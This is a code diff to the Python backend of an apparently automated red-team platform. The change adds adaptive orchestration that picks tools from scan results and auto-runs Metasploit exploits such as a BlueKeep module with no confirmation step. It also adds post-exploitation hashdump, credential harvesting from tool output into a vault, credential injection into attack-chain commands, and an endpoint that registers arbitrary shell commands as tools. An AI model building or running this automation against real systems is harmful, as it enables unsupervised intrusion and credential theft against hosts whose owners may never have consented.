@@ -624,8 +624,8 @@ class TacticalDecisionEngine:
         return decisions
     
     @classmethod
-    async def get_tactical_advice(cls, results: Dict, target: str) -> Dict[str, Any]:
-        """Get real-time tactical advice based on scan results"""
+    async def get_tactical_advice(cls, results: Dict, target: str, vault_context: Dict = None) -> Dict[str, Any]:
+        """Get real-time tactical advice with next_best_action for adaptive orchestration"""
         advice = {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "target": target,
@@ -634,8 +634,15 @@ class TacticalDecisionEngine:
             "vuln_decisions": [],
             "kill_chain_update": [],
             "priority_actions": [],
-            "overall_strategy": ""
+            "overall_strategy": "",
+            "next_best_action": None,
+            "trigger_chain": None,
+            "skip_tools": [],
+            "add_tools": []
         }
+        
+        has_waf = False
+        waf_active = False
         
         # Analyze WAF
         if "wafw00f" in results or "waf" in results:
@@ -643,25 +650,51 @@ class TacticalDecisionEngine:
             advice["waf_analysis"] = cls.analyze_waf_detection(waf_result)
             
             if advice["waf_analysis"]["waf_detected"]:
+                has_waf = True
+                waf_active = advice["waf_analysis"]["waf_detected"]
                 advice["priority_actions"].append({
                     "priority": 1,
                     "action": "WAF Bypass Required",
                     "details": advice["waf_analysis"]["alternative_approach"]
                 })
+                # Skip aggressive tools if WAF detected
+                advice["skip_tools"] = ["nikto", "sqlmap", "gobuster"]
+                advice["add_tools"] = ["subfinder"]  # Passive recon instead
         
         # Analyze ports
         if "nmap" in results:
             advice["port_decisions"] = cls.analyze_ports(results["nmap"])
             
             for decision in advice["port_decisions"]:
-                if "smb" in decision["service"] or "rdp" in decision["service"]:
+                svc = decision["service"]
+                
+                # Add service-specific tools dynamically
+                if "smb" in svc or "445" in decision.get("port", ""):
+                    advice["add_tools"].extend(["crackmapexec"])
+                    advice["priority_actions"].append({
+                        "priority": 1,
+                        "action": f"High-value: {svc} on {decision['port']}",
+                        "details": decision["decision"],
+                        "type": "exploit",
+                        "tool": "crackmapexec",
+                        "exploit": decision["exploits"][0] if decision["exploits"] else None,
+                        "port": decision["port"]
+                    })
+                elif "rdp" in svc or "3389" in decision.get("port", ""):
                     advice["priority_actions"].append({
                         "priority": 2,
-                        "action": f"High-value target: {decision['service']}",
-                        "details": decision["decision"]
+                        "action": f"RDP on {decision['port']}",
+                        "details": decision["decision"],
+                        "type": "exploit",
+                        "exploit": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+                        "port": decision["port"]
                     })
+                elif "ssh" in svc:
+                    advice["add_tools"].extend(["hydra"])
+                elif ("http" in svc or "80" in decision.get("port", "")) and not has_waf:
+                    advice["add_tools"].extend(["nikto", "gobuster"])
         
-        # Analyze vulnerabilities
+        # Analyze vulnerabilities  
         if "nikto" in results:
             advice["vuln_decisions"] = cls.analyze_vulnerabilities(results["nikto"])
             
@@ -669,20 +702,88 @@ class TacticalDecisionEngine:
                 if vuln["severity"] == "critical":
                     advice["priority_actions"].append({
                         "priority": 1,
-                        "action": f"Critical: {vuln['vulnerability']}",
-                        "details": vuln["next_action"]
+                        "action": f"CRITICAL: {vuln['vulnerability']}",
+                        "details": vuln["next_action"],
+                        "type": "vuln_exploit",
+                        "tool": vuln["tools"][0] if vuln["tools"] else None,
+                        "exploit": vuln["exploits"][0] if vuln["exploits"] else None,
+                        "command": vuln["command"]
                     })
         
         # Sort priority actions
         advice["priority_actions"].sort(key=lambda x: x["priority"])
         
+        # Determine next_best_action
+        vault = vault_context or {}
+        has_session = bool(vault.get("sessions"))
+        has_creds = bool(vault.get("credentials"))
+        
+        if advice["priority_actions"]:
+            top_action = advice["priority_actions"][0]
+            
+            # If critical vuln found AND we don't have a session yet -> exploit it
+            if top_action.get("type") == "vuln_exploit" and top_action.get("exploit") and not has_session:
+                advice["next_best_action"] = {
+                    "action": "run_exploit",
+                    "module": top_action["exploit"],
+                    "target": target,
+                    "reason": f"Critical vulnerability: {top_action['action']}"
+                }
+            elif top_action.get("type") == "exploit" and top_action.get("exploit") and not has_session:
+                advice["next_best_action"] = {
+                    "action": "run_exploit",
+                    "module": top_action["exploit"],
+                    "target": target,
+                    "port": top_action.get("port"),
+                    "reason": top_action["action"]
+                }
+            elif top_action.get("tool"):
+                advice["next_best_action"] = {
+                    "action": "run_tool",
+                    "tool": top_action["tool"],
+                    "target": target,
+                    "reason": top_action["action"]
+                }
+        
+        # If we have session but no creds -> prioritize credential harvesting
+        if has_session and not has_creds:
+            advice["next_best_action"] = {
+                "action": "post_exploit",
+                "module": "post/windows/gather/hashdump" if vault.get("os_info", {}).get("os") == "windows" else None,
+                "reason": "Session active - harvest credentials"
+            }
+        
+        # Check if we should auto-trigger an attack chain
+        results_text = json.dumps(results).lower()
+        chain_triggers = {
+            "web_to_shell": ["sql injection", "command injection", "rce", "file upload"],
+            "smb_to_domain": ["445/tcp", "ms17-010", "eternalblue", "smb"],
+            "kerberos_attack": ["88/tcp", "kerberos", "active directory"],
+            "linux_privesc": ["shell", "ssh"],
+            "windows_privesc": ["rdp", "winrm", "smb"],
+        }
+        
+        for chain_id, triggers in chain_triggers.items():
+            match_count = sum(1 for t in triggers if t in results_text)
+            if match_count >= 2 and not has_session:
+                matched = [t for t in triggers if t in results_text]
+                advice["trigger_chain"] = {
+                    "chain_id": chain_id,
+                    "triggers_matched": matched,
+                    "confidence": min(match_count / len(triggers), 1.0),
+                    "reason": f"Multiple indicators match: {', '.join(matched)}"
+                }
+                break
+        
         # Generate overall strategy
-        if advice["waf_analysis"] and advice["waf_analysis"]["waf_detected"]:
-            advice["overall_strategy"] = f"WAF detected ({advice['waf_analysis']['waf_name']}). Recommend indirect approach: origin IP discovery, subdomain enumeration for unprotected assets."
+        if has_waf:
+            advice["overall_strategy"] = f"WAF detected ({advice['waf_analysis']['waf_name']}). Indirect approach: skip aggressive tools, find origin IP."
+        elif has_session:
+            advice["overall_strategy"] = "Session active - focus on post-exploitation and lateral movement."
         elif advice["priority_actions"]:
-            advice["overall_strategy"] = f"Direct attack viable. Focus on: {advice['priority_actions'][0]['action']}"
+            advice["overall_strategy"] = f"Direct attack viable. Priority: {advice['priority_actions'][0]['action']}"
         else:
-            advice["overall_strategy"] = "Continue reconnaissance. No immediate high-value targets identified."
+            advice["overall_strategy"] = "Continue reconnaissance. No immediate high-value targets."
         
         return advice
 
@@ -986,52 +1087,235 @@ def build_attack_tree(scan_id: str, target: str, results: Dict, phases: List[str
     
     return tree
 
+from modules.credential_vault import CredentialVault
+from modules.session_manager import SessionManager
+
+# Global instances
+credential_vault = CredentialVault()
+session_manager = SessionManager()
+
+# Adaptive scan config
+SCAN_LIMITS = {
+    "max_tools": 20,
+    "max_time_seconds": 600,
+    "tool_timeout": 120,
+    "pause_between_tools": 1,
+    "max_consecutive_errors": 3,
+    "aggressive_tools": ["nikto", "sqlmap", "hydra", "gobuster"],
+    "stealth_tools": ["nmap", "wafw00f", "whatweb", "subfinder", "masscan"],
+}
+
 async def run_scan_background(scan_id: str, target: str, phases: List[str], tools: List[str]):
+    """ADAPTIVE ORCHESTRATION - Each tool result decides what runs next"""
     global scan_progress, attack_trees
+    
+    import time
+    start_time = time.time()
     
     scan_progress[scan_id] = {
         "status": "running", "current_tool": None, "progress": 0,
-        "results": {}, "tactical_decisions": [], "ai_analysis": None
+        "results": {}, "tactical_decisions": [], "ai_analysis": None,
+        "timeline": [], "vault_summary": {}, "adaptive_log": []
     }
     
-    tools_to_run = tools or [t for t, info in RED_TEAM_TOOLS.items() if info["phase"] in phases]
-    total_steps = len(tools_to_run) + 2  # +2 for tactical + AI
-    completed = 0
+    # Initialize vault context
+    credential_vault.update_context(scan_id, target=target, lhost="")
+    
+    # Phase 1: Build initial tool queue from phases
+    initial_tools = tools or [t for t, info in RED_TEAM_TOOLS.items() if info["phase"] in phases]
+    
+    # Prioritize: recon tools first, then aggressive
+    recon_first = [t for t in initial_tools if t in SCAN_LIMITS["stealth_tools"]]
+    aggressive_later = [t for t in initial_tools if t not in SCAN_LIMITS["stealth_tools"]]
+    tool_queue = recon_first + aggressive_later
+    
+    executed_tools = set()
+    consecutive_errors = 0
+    tool_count = 0
+    
+    def log_timeline(event_type: str, detail: str, data: Dict = None):
+        scan_progress[scan_id]["timeline"].append({
+            "time": datetime.now(timezone.utc).isoformat(),
+            "elapsed": round(time.time() - start_time, 1),
+            "type": event_type,
+            "detail": detail,
+            "data": data or {}
+        })
+    
+    def log_adaptive(decision: str, reason: str):
+        scan_progress[scan_id]["adaptive_log"].append({
+            "time": datetime.now(timezone.utc).isoformat(),
+            "decision": decision,
+            "reason": reason
+        })
     
     try:
-        for tool_id in tools_to_run:
+        log_timeline("start", f"Adaptive scan initiated for {target}", {"phases": phases})
+        
+        # ===== ADAPTIVE LOOP =====
+        while tool_queue and tool_count < SCAN_LIMITS["max_tools"]:
+            # Check time limit
+            elapsed = time.time() - start_time
+            if elapsed > SCAN_LIMITS["max_time_seconds"]:
+                log_adaptive("TIMEOUT", f"Time limit reached ({int(elapsed)}s)")
+                break
+            
+            # Check error limit
+            if consecutive_errors >= SCAN_LIMITS["max_consecutive_errors"]:
+                log_adaptive("ERROR_LIMIT", f"{consecutive_errors} consecutive errors")
+                break
+            
+            # Check for abort
+            if scan_progress.get(scan_id, {}).get("status") == "aborted":
+                log_adaptive("ABORTED", "User aborted scan")
+                break
+            
+            # Pick next tool
+            tool_id = tool_queue.pop(0)
+            
+            # Skip if already executed
+            if tool_id in executed_tools:
+                continue
+            
+            # Skip aggressive tools if WAF detected
+            waf_detected = any(
+                (td.get("advice") or {}).get("waf_analysis") is not None and (td.get("advice") or {}).get("waf_analysis", {}).get("waf_detected", False)
+                for td in scan_progress[scan_id]["tactical_decisions"]
+            )
+            if waf_detected and tool_id in SCAN_LIMITS["aggressive_tools"]:
+                log_adaptive("SKIP", f"Skipping {tool_id} - WAF active")
+                log_timeline("skip", f"Skipped {tool_id} due to WAF", {"reason": "waf_active"})
+                continue
+            
+            # Execute tool
             scan_progress[scan_id]["current_tool"] = tool_id
-            scan_progress[scan_id]["progress"] = int((completed / total_steps) * 100)
+            total_estimate = max(len(tool_queue) + len(executed_tools) + 3, 5)
+            scan_progress[scan_id]["progress"] = int((len(executed_tools) / total_estimate) * 80)
+            
+            log_timeline("tool_start", f"Executing {tool_id}")
             
             result = await run_tool(tool_id, target)
             scan_progress[scan_id]["results"][tool_id] = result
-            completed += 1
+            executed_tools.add(tool_id)
+            tool_count += 1
             
-            # TACTICAL DECISION after each tool
-            tactical = await TacticalDecisionEngine.get_tactical_advice(scan_progress[scan_id]["results"], target)
+            # Check for errors
+            if result.get("error"):
+                consecutive_errors += 1
+                log_timeline("tool_error", f"{tool_id} failed: {result['error']}")
+            else:
+                consecutive_errors = 0
+                log_timeline("tool_complete", f"{tool_id} completed")
+            
+            # Parse credentials from output
+            output_text = ""
+            if isinstance(result, dict):
+                output_text = result.get("output", result.get("raw", ""))
+            if isinstance(output_text, str) and output_text:
+                found_creds = CredentialVault.parse_credentials_from_output(output_text, tool_id, target)
+                for cred in found_creds:
+                    credential_vault.add_credential(scan_id, cred)
+                    log_timeline("credential", f"Found: {cred.get('type')} - {cred.get('username','?')}", cred)
+                
+                # Detect OS
+                os_info = CredentialVault.detect_os_from_output(output_text)
+                if os_info:
+                    credential_vault.update_context(scan_id, os_info=os_info)
+            
+            # Check for session indicators
+            result_str = json.dumps(result) if isinstance(result, dict) else str(result)
+            if (isinstance(result, dict) and result.get("session_opened")) or ("session" in result_str.lower() and "opened" in result_str.lower()):
+                os_detected = credential_vault.get_context(scan_id).get("os_info", {}).get("os", "unknown") if credential_vault.get_context(scan_id) else "unknown"
+                session_manager.register(scan_id, {"id": f"s_{tool_count}", "host": target, "type": "shell", "source": tool_id, "platform": os_detected})
+                log_timeline("session", f"Session opened via {tool_id}", {"host": target})
+            
+            # ===== TACTICAL DECISION - THE CORE OF ADAPTIVE ORCHESTRATION =====
+            vault_ctx = credential_vault.get_context(scan_id)
+            tactical = await TacticalDecisionEngine.get_tactical_advice(scan_progress[scan_id]["results"], target, vault_ctx)
+            
             scan_progress[scan_id]["tactical_decisions"].append({
                 "after_tool": tool_id,
                 "advice": tactical
             })
             
-            # Broadcast tactical update (for real-time UI)
-            logger.info(f"[TACTICAL] After {tool_id}: {tactical.get('overall_strategy', '')}")
+            # Process tactical decisions
+            # 1. Remove skipped tools from queue
+            for skip_tool in tactical.get("skip_tools", []):
+                if skip_tool in tool_queue:
+                    tool_queue.remove(skip_tool)
+                    log_adaptive("REMOVE", f"Removed {skip_tool} from queue ({tactical.get('overall_strategy','')})")
+            
+            # 2. Add dynamically suggested tools
+            for add_tool in tactical.get("add_tools", []):
+                if add_tool not in executed_tools and add_tool not in tool_queue and add_tool in RED_TEAM_TOOLS:
+                    tool_queue.insert(0, add_tool)  # Priority insertion
+                    log_adaptive("ADD", f"Added {add_tool} to queue")
+            
+            # 3. Handle next_best_action
+            nba = tactical.get("next_best_action")
+            if nba:
+                if nba["action"] == "run_exploit" and nba.get("module"):
+                    log_adaptive("EXPLOIT", f"Auto-running exploit: {nba['module']} ({nba.get('reason','')})")
+                    log_timeline("auto_exploit", f"Tactical engine triggered: {nba['module']}")
+                    
+                    exploit_result = await run_metasploit(nba["module"], target, None, {}, vault_ctx.get("lhost"), 4444)
+                    scan_progress[scan_id]["results"][f"msf_{nba['module'].split('/')[-1]}"] = exploit_result
+                    
+                    if exploit_result.get("session_opened"):
+                        os_detected = vault_ctx.get("os_info", {}).get("os", "unknown") if vault_ctx else "unknown"
+                        session_manager.register(scan_id, {"id": f"msf_{tool_count}", "host": target, "type": "meterpreter", "source": nba["module"], "platform": os_detected})
+                        log_timeline("session", f"Session from auto-exploit: {nba['module']}")
+                    
+                    output_text = exploit_result.get("output", "") if isinstance(exploit_result, dict) else ""
+                    if isinstance(output_text, str) and output_text:
+                        for cred in CredentialVault.parse_credentials_from_output(output_text, nba["module"], target):
+                            credential_vault.add_credential(scan_id, cred)
+                
+                elif nba["action"] == "run_tool" and nba.get("tool"):
+                    tool_name = nba["tool"]
+                    if tool_name not in executed_tools and tool_name not in tool_queue:
+                        tool_queue.insert(0, tool_name)
+                        log_adaptive("PRIORITIZE", f"Prioritized {tool_name}: {nba.get('reason','')}")
+                
+                elif nba["action"] == "post_exploit" and session_manager.has_active(scan_id):
+                    post_actions = session_manager.get_post_exploit_actions(scan_id)
+                    for pa in post_actions[:3]:
+                        if pa.get("module"):
+                            log_adaptive("POST_EXPLOIT", f"Running: {pa['module']}")
+                            pe_result = await run_metasploit(pa["module"], target, None, {}, None, 4444)
+                            scan_progress[scan_id]["results"][f"post_{pa['action']}"] = pe_result
+                            output_text = pe_result.get("output", "") if isinstance(pe_result, dict) else ""
+                            if isinstance(output_text, str) and output_text:
+                                for cred in CredentialVault.parse_credentials_from_output(output_text, pa["module"], target):
+                                    credential_vault.add_credential(scan_id, cred)
+            
+            # 4. Handle chain trigger
+            chain_trigger = tactical.get("trigger_chain")
+            if chain_trigger and chain_trigger.get("confidence", 0) >= 0.5:
+                log_adaptive("CHAIN_TRIGGER", f"Auto-triggering chain: {chain_trigger['chain_id']} (confidence: {chain_trigger['confidence']:.0%})")
+                log_timeline("chain_trigger", f"Attack chain triggered: {chain_trigger['chain_id']}", chain_trigger)
+                # Don't execute chain in scan loop, just record the suggestion strongly
+                scan_progress[scan_id]["auto_triggered_chain"] = chain_trigger
+            
+            # Pause between tools
+            await asyncio.sleep(SCAN_LIMITS["pause_between_tools"])
         
-        # Final tactical analysis
+        # ===== POST-LOOP: Final analysis =====
         scan_progress[scan_id]["current_tool"] = "tactical_engine"
-        final_tactical = await TacticalDecisionEngine.get_tactical_advice(scan_progress[scan_id]["results"], target)
-        scan_progress[scan_id]["final_tactical"] = final_tactical
-        completed += 1
+        scan_progress[scan_id]["progress"] = 85
         
-        # AI Analysis with tactical context
+        final_tactical = await TacticalDecisionEngine.get_tactical_advice(scan_progress[scan_id]["results"], target, credential_vault.get_context(scan_id))
+        scan_progress[scan_id]["final_tactical"] = final_tactical
+        
+        # AI Analysis
         scan_progress[scan_id]["current_tool"] = "kimi_ai"
-        scan_progress[scan_id]["progress"] = int((completed / total_steps) * 100)
+        scan_progress[scan_id]["progress"] = 90
         
         ai_result = await get_tactical_ai_advice(scan_progress[scan_id]["results"], target, final_tactical)
         scan_progress[scan_id]["ai_analysis"] = ai_result["analysis"]
         scan_progress[scan_id]["exploits"] = ai_result.get("exploits", [])
         
-        # Build attack tree with tactical info
+        # Build attack tree
         attack_tree = build_attack_tree(scan_id, target, scan_progress[scan_id]["results"], phases, ai_result, final_tactical)
         scan_progress[scan_id]["attack_tree"] = attack_tree
         attack_trees[scan_id] = attack_tree
@@ -1039,13 +1323,21 @@ async def run_scan_background(scan_id: str, target: str, phases: List[str], tool
         scan_progress[scan_id]["status"] = "completed"
         scan_progress[scan_id]["progress"] = 100
         
-        # Auto-detect applicable attack chains based on findings
+        # Auto-detect applicable chains
         suggested_chains = AttackChainEngine.get_applicable_chains(scan_progress[scan_id]["results"])
         scan_progress[scan_id]["suggested_chains"] = suggested_chains
         
-        # Get recommended MSF modules based on findings
+        # Recommended MSF modules
         recommended_modules = get_recommended_modules(scan_progress[scan_id]["results"], final_tactical)
         scan_progress[scan_id]["recommended_modules"] = recommended_modules
+        
+        # Vault summary
+        scan_progress[scan_id]["vault_summary"] = credential_vault.get_vault_summary(scan_id)
+        
+        # Save vault to DB
+        await credential_vault.save_to_db(scan_id)
+        
+        log_timeline("complete", f"Scan complete. Tools: {tool_count}, Creds: {len(credential_vault.get_credentials(scan_id))}, Sessions: {len(session_manager.get_sessions(scan_id))}")
         
         await db.scans.insert_one({
             "id": scan_id, "target": target, "status": "completed",
@@ -1056,13 +1348,19 @@ async def run_scan_background(scan_id: str, target: str, phases: List[str], tool
             "attack_tree": attack_tree,
             "suggested_chains": suggested_chains,
             "recommended_modules": recommended_modules,
+            "vault_summary": scan_progress[scan_id]["vault_summary"],
+            "timeline": scan_progress[scan_id]["timeline"],
+            "adaptive_log": scan_progress[scan_id]["adaptive_log"],
             "created_at": datetime.now(timezone.utc).isoformat()
         })
         
     except Exception as e:
+        import traceback
         logger.error(f"Scan error: {str(e)}")
+        logger.error(traceback.format_exc())
         scan_progress[scan_id]["status"] = "error"
         scan_progress[scan_id]["error"] = str(e)
+        log_timeline("error", str(e))
 
 
 def get_recommended_modules(results: Dict, tactical: Dict) -> List[Dict]:
@@ -1167,7 +1465,11 @@ async def get_scan_status(scan_id: str):
             "ai_analysis": p.get("ai_analysis"), "exploits": p.get("exploits", []),
             "attack_tree": p.get("attack_tree"),
             "suggested_chains": p.get("suggested_chains", []),
-            "recommended_modules": p.get("recommended_modules", [])
+            "recommended_modules": p.get("recommended_modules", []),
+            "vault_summary": p.get("vault_summary", {}),
+            "timeline": p.get("timeline", []),
+            "adaptive_log": p.get("adaptive_log", []),
+            "auto_triggered_chain": p.get("auto_triggered_chain")
         }
     
     scan = await db.scans.find_one({"id": scan_id}, {"_id": 0})
@@ -1180,7 +1482,11 @@ async def get_scan_status(scan_id: str):
             "ai_analysis": scan.get("ai_analysis"), "exploits": scan.get("exploits", []),
             "attack_tree": scan.get("attack_tree"),
             "suggested_chains": scan.get("suggested_chains", []),
-            "recommended_modules": scan.get("recommended_modules", [])
+            "recommended_modules": scan.get("recommended_modules", []),
+            "vault_summary": scan.get("vault_summary", {}),
+            "timeline": scan.get("timeline", []),
+            "adaptive_log": scan.get("adaptive_log", []),
+            "auto_triggered_chain": scan.get("auto_triggered_chain")
         }
     raise HTTPException(status_code=404, detail="Scan not found")
 
@@ -1559,12 +1865,14 @@ async def execute_chain(request: ChainExecutionRequest, background_tasks: Backgr
     }
 
 async def run_chain_background(execution_id: str):
-    """Background task to execute chain steps with real-time tracking"""
+    """Background task to execute chain steps with conditional evaluation and credential injection"""
     import asyncio
     chain_exec = active_chains.get(execution_id)
     if not chain_exec:
         return
     
+    scan_id = chain_exec.get("scan_id", "")
+    target = chain_exec["target"]
     chain_exec["started_at"] = datetime.now(timezone.utc).isoformat()
     total_steps = len(chain_exec["commands"])
     
@@ -1572,34 +1880,82 @@ async def run_chain_background(execution_id: str):
         chain_exec["current_step"] = i + 1
         chain_exec["progress"] = int((i / total_steps) * 100)
         
-        # Mark step as running
         step_status = {
             "step_id": step["step_id"],
             "step_name": step["step_name"],
             "status": "running",
             "started_at": datetime.now(timezone.utc).isoformat(),
-            "command_results": []
+            "command_results": [],
+            "skipped": False,
+            "skip_reason": ""
         }
         
-        # Update step_statuses
         if "step_statuses" not in chain_exec:
             chain_exec["step_statuses"] = {}
         chain_exec["step_statuses"][str(step["step_id"])] = step_status
         
+        # === CONDITIONAL EVALUATION (Point 4) ===
+        condition_met = True
+        for cmd in step["commands"]:
+            condition = cmd.get("condition", "")
+            if condition:
+                vault_ctx = credential_vault.get_context(scan_id) if scan_id else {}
+                results = scan_progress.get(scan_id, {}).get("results", {})
+                results_text = json.dumps(results).lower()
+                
+                if condition == "sqli" and "sql injection" not in results_text and "sqlmap" not in results_text:
+                    condition_met = False
+                    step_status["skip_reason"] = f"Condition '{condition}' not met - no SQLi detected"
+                elif condition == "shell" and not session_manager.has_active(scan_id):
+                    condition_met = False
+                    step_status["skip_reason"] = f"Condition '{condition}' not met - no active session"
+                elif condition == "linux" and vault_ctx.get("os_info", {}).get("os") != "linux":
+                    condition_met = False
+                    step_status["skip_reason"] = f"Condition '{condition}' not met - OS is not Linux"
+                elif condition == "windows" and vault_ctx.get("os_info", {}).get("os") != "windows":
+                    condition_met = False
+                    step_status["skip_reason"] = f"Condition '{condition}' not met - OS is not Windows"
+                elif condition == "creds" and not credential_vault.get_credentials(scan_id):
+                    condition_met = False
+                    step_status["skip_reason"] = f"Condition '{condition}' not met - no credentials in vault"
+        
+        if not condition_met:
+            step_status["status"] = "skipped"
+            step_status["skipped"] = True
+            step_status["completed_at"] = datetime.now(timezone.utc).isoformat()
+            chain_exec["results"].append(step_status)
+            await asyncio.sleep(0.2)
+            continue
+        
+        # === EXECUTE STEP WITH CREDENTIAL INJECTION (Point 3) ===
         step_success = True
         for cmd in step["commands"]:
             try:
+                # Inject credentials from vault
+                command_str = cmd.get("command", "")
+                if scan_id:
+                    command_str = credential_vault.inject_context(command_str, scan_id, target, chain_exec.get("context", {}))
+                
                 if cmd.get("module"):
-                    result = await run_metasploit(cmd["module"], chain_exec["target"], None, {}, chain_exec.get("lhost"), 4444)
+                    result = await run_metasploit(cmd["module"], target, None, {}, chain_exec.get("lhost"), 4444)
+                    
+                    # Parse credentials from exploit output
+                    output = result.get("output", "")
+                    if isinstance(output, str) and scan_id:
+                        for cred in CredentialVault.parse_credentials_from_output(output, cmd["module"], target):
+                            credential_vault.add_credential(scan_id, cred)
+                    
+                    # Check for session
+                    if result.get("session_opened") and scan_id:
+                        session_manager.register(scan_id, {"id": f"chain_{execution_id}_{step['step_id']}", "host": target, "type": "shell", "source": cmd["module"]})
                 else:
-                    # Simulate command execution with delay
                     await asyncio.sleep(1)
                     result = {
-                        "command": cmd["command"],
+                        "command": command_str,
                         "tool": cmd.get("tool", "shell"),
                         "simulated": True,
                         "success": True,
-                        "output": f"[SIM] Executed: {cmd['command'][:120]}"
+                        "output": f"[SIM] Executed: {command_str[:120]}"
                     }
                 step_status["command_results"].append(result)
             except Exception as e:
@@ -1610,14 +1966,17 @@ async def run_chain_background(execution_id: str):
         step_status["completed_at"] = datetime.now(timezone.utc).isoformat()
         chain_exec["results"].append(step_status)
         
-        # Brief pause between steps for realism
         await asyncio.sleep(0.5)
     
     chain_exec["status"] = "completed"
     chain_exec["progress"] = 100
     chain_exec["completed_at"] = datetime.now(timezone.utc).isoformat()
     
-    # Save to database
+    # Save vault after chain
+    if scan_id:
+        chain_exec["vault_summary"] = credential_vault.get_vault_summary(scan_id)
+        await credential_vault.save_to_db(scan_id)
+    
     save_data = {k: v for k, v in chain_exec.items()}
     await db.chain_executions.insert_one({"id": execution_id, **save_data})
 
@@ -1709,6 +2068,95 @@ async def execute_chain_step(execution_id: str, step_id: int):
         chain_exec["completed_at"] = datetime.now(timezone.utc).isoformat()
     
     return step_results
+
+
+# ============ VAULT & TIMELINE ENDPOINTS ============
+
+@api_router.get("/scan/{scan_id}/vault")
+async def get_scan_vault(scan_id: str):
+    """Get credential vault contents for a scan"""
+    summary = credential_vault.get_vault_summary(scan_id)
+    creds = credential_vault.get_credentials(scan_id)
+    # Mask sensitive values
+    safe_creds = []
+    for c in creds:
+        safe = {**c}
+        if safe.get("value") and safe.get("type") == "plaintext":
+            safe["value"] = safe["value"][:2] + "***" + safe["value"][-1:]
+        safe_creds.append(safe)
+    return {"summary": summary, "credentials": safe_creds, "context": credential_vault.get_context(scan_id)}
+
+@api_router.get("/scan/{scan_id}/timeline")
+async def get_scan_timeline(scan_id: str):
+    """Get chronological attack timeline"""
+    if scan_id in scan_progress:
+        return {"timeline": scan_progress[scan_id].get("timeline", []), "adaptive_log": scan_progress[scan_id].get("adaptive_log", [])}
+    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "timeline": 1, "adaptive_log": 1})
+    if scan:
+        return {"timeline": scan.get("timeline", []), "adaptive_log": scan.get("adaptive_log", [])}
+    raise HTTPException(status_code=404, detail="Not found")
+
+@api_router.get("/scan/{scan_id}/sessions")
+async def get_scan_sessions(scan_id: str):
+    """Get active sessions for a scan"""
+    sessions = session_manager.get_sessions(scan_id)
+    post_actions = session_manager.get_post_exploit_actions(scan_id)
+    return {"sessions": sessions, "post_exploit_actions": post_actions}
+
+@api_router.post("/scan/{scan_id}/abort")
+async def abort_scan(scan_id: str):
+    """Abort a running scan"""
+    if scan_id in scan_progress and scan_progress[scan_id]["status"] == "running":
+        scan_progress[scan_id]["status"] = "aborted"
+        scan_progress[scan_id]["progress"] = scan_progress[scan_id].get("progress", 0)
+        return {"status": "aborted", "scan_id": scan_id}
+    raise HTTPException(status_code=400, detail="Scan not running")
+
+# ============ DYNAMIC TOOL CATALOG (Point 6) ============
+
+@api_router.post("/tools/add")
+async def add_custom_tool(data: Dict[str, Any]):
+    """Add a custom tool to the catalog"""
+    tool_id = data.get("id", "").lower().replace(" ", "_")
+    if not tool_id or not data.get("cmd"):
+        raise HTTPException(status_code=400, detail="id and cmd required")
+    
+    RED_TEAM_TOOLS[tool_id] = {
+        "phase": data.get("phase", "reconnaissance"),
+        "mitre": data.get("mitre", ""),
+        "cmd": data.get("cmd"),
+        "desc": data.get("desc", "Custom tool")
+    }
+    
+    # Persist to DB
+    await db.custom_tools.update_one({"id": tool_id}, {"$set": {"id": tool_id, **RED_TEAM_TOOLS[tool_id]}}, upsert=True)
+    return {"status": "added", "tool": RED_TEAM_TOOLS[tool_id]}
+
+@api_router.delete("/tools/{tool_id}")
+async def remove_custom_tool(tool_id: str):
+    """Remove a custom tool"""
+    if tool_id in RED_TEAM_TOOLS:
+        del RED_TEAM_TOOLS[tool_id]
+        await db.custom_tools.delete_one({"id": tool_id})
+        return {"status": "removed", "tool_id": tool_id}
+    raise HTTPException(status_code=404, detail="Tool not found")
+
+@api_router.post("/metasploit/modules/add")
+async def add_custom_msf_module(data: Dict[str, Any]):
+    """Add a custom MSF module"""
+    if not data.get("name"):
+        raise HTTPException(status_code=400, detail="name required")
+    module = {
+        "name": data["name"],
+        "desc": data.get("desc", ""),
+        "rank": data.get("rank", "normal"),
+        "category": data.get("category", "exploit"),
+        "mitre": data.get("mitre", "")
+    }
+    METASPLOIT_MODULES.append(module)
+    await db.custom_modules.update_one({"name": module["name"]}, {"$set": module}, upsert=True)
+    return {"status": "added", "module": module}
+
 
 # ============ WEBSOCKET REAL-TIME UPDATES ============
 
